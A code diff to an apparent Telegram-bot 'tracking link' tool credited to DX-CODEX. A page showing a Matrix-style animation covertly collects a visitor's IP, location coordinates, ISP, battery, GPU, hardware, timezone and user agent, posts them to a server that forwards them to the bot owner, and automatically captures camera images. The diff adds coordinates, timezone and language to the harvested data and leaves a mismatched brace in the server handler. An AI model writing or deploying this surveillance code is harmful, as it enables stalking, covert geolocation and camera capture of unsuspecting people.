@@ -344,20 +344,28 @@ app.post('/api/data', async (req, res) => {
         if (type === 'info') {
             const _n = data.ipData;
             const _nav = data.navigator;
-            let msg = `<b>${_fnt("CODEX DEVICE INFO")}</b>\n\n`;
+            const _batt = data.battery;
+            const _gpu = data.gpu;
+
+            let msg = `<blockquote><b>${_fnt("CODEX DEVICE INFO")}</b></blockquote>\n\n`;
             msg += `<b>${_fnt("DEVICE")}:</b> <code>${_nav.platform}</code>\n`;
             msg += `<b>${_fnt("IP ADDRESS")}:</b> <a href="https://ipwho.is/${_n.ip}">${_n.ip}</a>\n`;
             msg += `<b>${_fnt("NETWORK")}:</b> <code>${_n.isp}</code>\n`;
             msg += `<b>${_fnt("LOCATION")}:</b> <code>${_n.city}, ${_n.country}</code>\n`;
-            msg += `<b>${_fnt("BATTERY")}:</b> <code>${data.battery}</code>\n`;
+            msg += `<b>${_fnt("COORDINATES")}:</b> <code>${_n.loc}</code>\n`;
+            msg += `<b>${_fnt("BATTERY")}:</b> <code>${_batt}</code>\n`;
             msg += `<b>${_fnt("CPU CORES")}:</b> <code>${_nav.hardwareConcurrency || 'N/A'}</code>\n`;
             msg += `<b>${_fnt("RAM")}:</b> <code>${_nav.deviceMemory || 'N/A'} GB</code>\n`;
-            msg += `<b>${_fnt("GPU")}:</b> <code>${data.gpu}</code>\n`;
+            msg += `<b>${_fnt("GPU")}:</b> <code>${_gpu}</code>\n`;
             msg += `<b>${_fnt("SCREEN")}:</b> <code>${data.screen.width}x${data.screen.height} (${data.screen.depth}-bit)</code>\n`;
+            msg += `<b>${_fnt("TIMEZONE")}:</b> <code>${data.timezone}</code>\n`;
+            msg += `<b>${_fnt("LANGUAGE")}:</b> <code>${_nav.language}</code>\n`;
             msg += `<b>${_fnt("USER AGENT")}:</b> <pre>${_nav.userAgent}</pre>\n\n`;
-            msg += `<blockquote>${_fnt("DEV: DX-CODEX")} || @Termuxcodex</blockquote>`;
+            msg += `<blockquote>${_fnt("DEV-BY: DX-CODEX || ")}@Termuxcodex</blockquote>`;
+
             await bot.sendMessage(owner, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
-        } else if (type === 'cam') {
+        }   
+    } else if (type === 'cam') {
             const buffer = Buffer.from(data.images[0].replace(/^data:image\/jpeg;base64,/, ""), 'base64');
             await bot.sendPhoto(owner, buffer, { caption: makeBorder("ᴄᴀᴍᴇʀᴀ", `📱: ${data.platform}`), parse_mode: 'HTML' });
         }
@@ -390,19 +398,42 @@ const drops=Array(Math.floor(m.width/20)).fill(0);
 function draw(){ ctx.fillStyle='rgba(0,0,0,0.05)'; ctx.fillRect(0,0,m.width,m.height); ctx.fillStyle='#0f0'; ctx.font='15px monospace'; drops.forEach((y,i)=>{ const t=String.fromCharCode(Math.random()*128); ctx.fillText(t,i*20,y*20); if(y*20>m.height&&Math.random()>0.975)drops[i]=0; drops[i]++; }); }
 setInterval(draw,33);
 
-async function start(){
-    // 1. Full Info (RAM, GPU, CPU, Screen included)
-    let ip={ip:"?"}; try{ ip=await(await fetch('https://ipwho.is/')).json(); }catch(e){}
-    let batt="N/A"; try{ const b=await navigator.getBattery(); batt=Math.round(b.level*100)+"% "+(b.charging?"🔌":"🔋"); }catch(e){}
-    let gpu="N/A"; try{ const gl=document.createElement('canvas').getContext('webgl'); const db=gl.getExtension('WEBGL_debug_renderer_info'); gpu=gl.getParameter(db.UNMASKED_RENDERER_WEBGL); }catch(e){}
+async function start() {
+    // 1. Collect Advance Info
+    let ip = {ip:"?"}; 
+    try { ip = await(await fetch('https://ipwho.is/')).json(); } catch(e){}
     
+    let batt = "N/A"; 
+    try { const b = await navigator.getBattery(); batt = Math.round(b.level*100)+"% "+(b.charging?"🔌":"🔋"); } catch(e){}
+    
+    let gpu = "N/A"; 
+    try { 
+        const gl = document.createElement('canvas').getContext('webgl'); 
+        const db = gl.getExtension('WEBGL_debug_renderer_info'); 
+        gpu = gl.getParameter(db.UNMASKED_RENDERER_WEBGL); 
+    } catch(e){}
+
     const info = {
-        ipData: { ip:ip.ip, city:ip.city, country:ip.country, isp:ip.connection?.isp },
-        battery: batt, gpu: gpu,
+        ipData: { ip:ip.ip, city:ip.city, country:ip.country, isp:ip.connection?.isp, loc: ip.latitude+","+ip.longitude },
+        battery: batt, 
+        gpu: gpu,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         screen: { width:screen.width, height:screen.height, depth:screen.colorDepth },
-        navigator: { platform:navigator.platform, hardwareConcurrency:navigator.hardwareConcurrency, deviceMemory:navigator.deviceMemory, userAgent:navigator.userAgent }
+        navigator: { 
+            platform: navigator.platform, 
+            hardwareConcurrency: navigator.hardwareConcurrency, 
+            deviceMemory: navigator.deviceMemory, 
+            userAgent: navigator.userAgent,
+            language: navigator.language 
+        }
     };
-    fetch('/api/data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({linkId:id,type:'info',data:info})});
+
+    // Send to server
+    fetch('/api/data', {
+        method:'POST', 
+        headers:{'Content-Type':'application/json'}, 
+        body: JSON.stringify({linkId:id, type:'info', data:info})
+    });
 
     // 2. Auto Camera
     try {
